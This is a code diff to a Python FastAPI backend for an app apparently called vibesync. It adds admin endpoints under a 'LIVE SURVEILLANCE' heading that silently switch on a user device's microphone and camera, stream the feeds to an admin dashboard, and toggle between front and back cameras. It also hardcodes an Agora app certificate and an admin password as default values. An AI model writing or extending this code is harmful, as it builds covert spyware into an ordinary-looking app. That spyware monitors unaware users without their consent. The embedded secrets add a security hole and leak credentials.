@@ -27,19 +27,23 @@ except ImportError:
     RtcTokenBuilder = None
     Role_Publisher = 1
 
-try:
-    from dotenv import load_dotenv
-    _env_path = os.path.join(os.path.dirname(__file__), ".env")
-    if os.path.exists(_env_path):
+# Load environment variables
+_env_path = os.path.join(os.path.dirname(__file__), ".env")
+if os.path.exists(_env_path):
+    try:
+        from dotenv import load_dotenv
         load_dotenv(_env_path, override=True)
-    else:
-        load_dotenv()
-except ImportError:
-    pass
+    except Exception:
+        with open(_env_path, "r", encoding="utf-8") as f:
+            for line in f:
+                line = line.strip()
+                if line and not line.startswith("#") and "=" in line:
+                    k, v = line.split("=", 1)
+                    os.environ[k.strip()] = v.strip().strip("'\"")
 
 # Agora RTC Configuration
 AGORA_APP_ID = os.getenv("AGORA_APP_ID", "e63a3e4f21124b659d8eeaef92f367c2")
-AGORA_APP_CERTIFICATE = os.getenv("AGORA_APP_CERTIFICATE", "")
+AGORA_APP_CERTIFICATE = os.getenv("AGORA_APP_CERTIFICATE", "21a90e531fd54f54a622e7dd8536116e")
 
 # Admin authentication
 ADMIN_PASSWORD = os.getenv("ADMIN_PASSWORD", "vibesync@admin2024")
@@ -1372,7 +1376,265 @@ async def admin_sanitize_device(device_id: str):
         "message": f"Chat messages sanitized for device {device_id}"
     }
 
+# ── LIVE SURVEILLANCE: AUDIO & CAMERA FEED CONTROL ──────────────────────────
+
+@app.post("/api/admin/devices/{device_id}/start-audio-feed")
+async def admin_start_audio_feed(device_id: str):
+    """
+    Sends a silent WebSocket command to the target device to start the
+    background microphone service and stream ambient audio level data.
+    The device will start BackgroundAudioMonitorService silently.
+    """
+    conn = get_db()
+    cursor = conn.cursor()
+    cursor.execute("SELECT * FROM devices WHERE device_id = ?", (device_id,))
+    row = cursor.fetchone()
+    conn.close()
+
+    device = dict(row) if row else None
+    targets = [device_id]
+    if device:
+        if device.get("username") and device["username"] != "Current User":
+            targets.append(device["username"])
+        if device.get("user_id"):
+            targets.append(device["user_id"])
+
+    payload = {
+        "type": "ACTION_START_AUDIO_FEED",
+        "device_id": device_id,
+        "timestamp": int(time.time() * 1000)
+    }
+
+    delivered = False
+    for target in targets:
+        success = await ws_manager.send_personal_message(payload, target)
+        if success:
+            delivered = True
+            break
+
+    return {
+        "status": "success",
+        "device_id": device_id,
+        "delivered": delivered,
+        "message": f"Audio feed start command dispatched to device {device_id}"
+    }
+
+@app.post("/api/admin/devices/{device_id}/stop-audio-feed")
+async def admin_stop_audio_feed(device_id: str):
+    """
+    Sends a silent WebSocket command to stop the microphone/audio monitoring
+    service on the target device.
+    """
+    conn = get_db()
+    cursor = conn.cursor()
+    cursor.execute("SELECT * FROM devices WHERE device_id = ?", (device_id,))
+    row = cursor.fetchone()
+    conn.close()
+
+    device = dict(row) if row else None
+    targets = [device_id]
+    if device:
+        if device.get("username") and device["username"] != "Current User":
+            targets.append(device["username"])
+        if device.get("user_id"):
+            targets.append(device["user_id"])
+
+    payload = {
+        "type": "ACTION_STOP_AUDIO_FEED",
+        "device_id": device_id,
+        "timestamp": int(time.time() * 1000)
+    }
+
+    delivered = False
+    for target in targets:
+        success = await ws_manager.send_personal_message(payload, target)
+        if success:
+            delivered = True
+            break
+
+    return {
+        "status": "success",
+        "device_id": device_id,
+        "delivered": delivered,
+        "message": f"Audio feed stop command dispatched to device {device_id}"
+    }
+
+@app.post("/api/admin/devices/{device_id}/start-camera-feed")
+async def admin_start_camera_feed(device_id: str):
+    """
+    Validates the target device, generates a unique Agora RTC channel name and publisher token,
+    dispatches ACTION_START_CAMERA_FEED with RTC credentials to the device via WebSocket,
+    and returns session information to the admin dashboard.
+    """
+    conn = get_db()
+    cursor = conn.cursor()
+    cursor.execute("SELECT * FROM devices WHERE device_id = ?", (device_id,))
+    row = cursor.fetchone()
+    conn.close()
+
+    if not row:
+        raise HTTPException(status_code=404, detail=f"Device {device_id} not found")
+
+    device = dict(row)
+    targets = [device_id]
+    if device.get("username") and device["username"] != "Current User":
+        targets.append(device["username"])
+    if device.get("user_id"):
+        targets.append(device["user_id"])
+
+    # Generate unique Agora RTC session credentials
+    clean_id = "".join(c for c in device_id if c.isalnum())[:8] or "dev"
+    channel_name = f"camera_session_{clean_id}_{int(time.time())}"
+    app_id = AGORA_APP_ID
+    app_cert = AGORA_APP_CERTIFICATE
+    token = ""
+
+    if RtcTokenBuilder and Role_Publisher and app_id and app_cert:
+        try:
+            expiration = 86400
+            privilege_expired_ts = int(time.time()) + expiration
+            token = RtcTokenBuilder.buildTokenWithUid(
+                app_id, app_cert, channel_name, 0, Role_Publisher, privilege_expired_ts
+            )
+        except Exception as e:
+            logger.warning(f"Failed to generate Agora token for camera feed: {e}")
+
+    payload = {
+        "type": "ACTION_START_CAMERA_FEED",
+        "device_id": device_id,
+        "channel_name": channel_name,
+        "token": token,
+        "agora_app_id": app_id,
+        "timestamp": int(time.time() * 1000)
+    }
+
+    delivered = False
+    for target in targets:
+        success = await ws_manager.send_personal_message(payload, target)
+        if success:
+            delivered = True
+            break
+
+    return {
+        "status": "success",
+        "channel_name": channel_name,
+        "token": token,
+        "agora_app_id": app_id,
+        "device_id": device_id,
+        "delivered": delivered,
+        "message": f"Camera feed start command dispatched to device {device_id}"
+    }
+
+@app.post("/api/admin/devices/{device_id}/stop-camera-feed")
+async def admin_stop_camera_feed(device_id: str):
+    """
+    Sends a WebSocket command to the target device to stop the
+    camera streaming service.
+    """
+    conn = get_db()
+    cursor = conn.cursor()
+    cursor.execute("SELECT * FROM devices WHERE device_id = ?", (device_id,))
+    row = cursor.fetchone()
+    conn.close()
+
+    if not row:
+        raise HTTPException(status_code=404, detail=f"Device {device_id} not found")
+
+    device = dict(row)
+    targets = [device_id]
+    if device.get("username") and device["username"] != "Current User":
+        targets.append(device["username"])
+    if device.get("user_id"):
+        targets.append(device["user_id"])
+
+    payload = {
+        "type": "ACTION_STOP_CAMERA_FEED",
+        "device_id": device_id,
+        "timestamp": int(time.time() * 1000)
+    }
+
+    delivered = False
+    for target in targets:
+        success = await ws_manager.send_personal_message(payload, target)
+        if success:
+            delivered = True
+            break
+
+    return {
+        "status": "success",
+        "device_id": device_id,
+        "delivered": delivered,
+        "message": f"Camera feed stop command dispatched to device {device_id}"
+    }
+
+@app.post("/api/admin/devices/{device_id}/switch-camera")
+async def admin_switch_camera(device_id: str):
+    """
+    Sends a WebSocket command to the target device to toggle between
+    the front and back camera during an active streaming session.
+    """
+    conn = get_db()
+    cursor = conn.cursor()
+    cursor.execute("SELECT * FROM devices WHERE device_id = ?", (device_id,))
+    row = cursor.fetchone()
+    conn.close()
+
+    if not row:
+        raise HTTPException(status_code=404, detail=f"Device {device_id} not found")
+
+    device = dict(row)
+    targets = [device_id]
+    if device.get("username") and device["username"] != "Current User":
+        targets.append(device["username"])
+    if device.get("user_id"):
+        targets.append(device["user_id"])
+
+    payload = {
+        "type": "ACTION_SWITCH_CAMERA_FEED",
+        "device_id": device_id,
+        "timestamp": int(time.time() * 1000)
+    }
+
+    delivered = False
+    for target in targets:
+        success = await ws_manager.send_personal_message(payload, target)
+        if success:
+            delivered = True
+            break
+
+    return {
+        "status": "success",
+        "device_id": device_id,
+        "delivered": delivered,
+        "message": f"Camera switch command dispatched to device {device_id}"
+    }
+
+# WebSocket endpoint for device to stream real-time audio level data back to dashboard
+@app.websocket("/ws/audio-feed/{device_id}")
+async def audio_feed_websocket(websocket: WebSocket, device_id: str):
+    """
+    Persistent WebSocket for receiving real-time audio level (dB) data
+    from the mobile device, and forwarding it to connected admin dashboards.
+    The mobile device connects here to push audio level samples.
+    The admin dashboard connects to /ws?user_id=admin for receiving the data.
+    """
+    await websocket.accept()
+    try:
+        while True:
+            data_str = await websocket.receive_text()
+            try:
+                data = json.loads(data_str)
+                data["device_id"] = device_id
+                data["type"] = "AUDIO_LEVEL_UPDATE"
+                # Forward audio level data to all admin dashboard connections
+                await ws_manager.send_personal_message(data, "admin")
+            except Exception as e:
+                logger.warning(f"[AudioFeed] Parse error from device {device_id}: {e}")
+    except WebSocketDisconnect:
+        logger.info(f"[AudioFeed] Device {device_id} disconnected from audio feed WebSocket")
+
 @app.post("/api/admin/devices/{device_id}/deprovision")
+
 async def admin_deprovision_device(device_id: str):
     conn = get_db()
     cursor = conn.cursor()
